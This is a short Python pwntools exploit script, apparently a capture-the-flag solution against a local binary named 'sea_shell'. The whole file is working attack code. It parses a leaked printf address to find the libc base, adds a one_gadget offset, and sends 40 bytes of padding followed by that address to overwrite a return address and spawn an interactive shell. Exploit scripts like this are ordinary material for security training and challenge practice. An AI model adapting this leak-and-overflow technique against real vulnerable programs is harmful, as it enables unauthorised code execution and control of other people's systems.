from pwn import *

# context.terminal = ["termite", "-e"]

context.log_level = 'debug'
r = process("./sea_shell")

r.recvuntil(":")
leak = int(r.recvuntil("\n"), 16)

one_gadget = 0x4F2C5
printf_off = 0x00064E80

libc_base = leak - printf_off
addr = libc_base + one_gadget

print(hex(addr))


r.sendline("i" * 40 + p64(addr))

r.interactive()
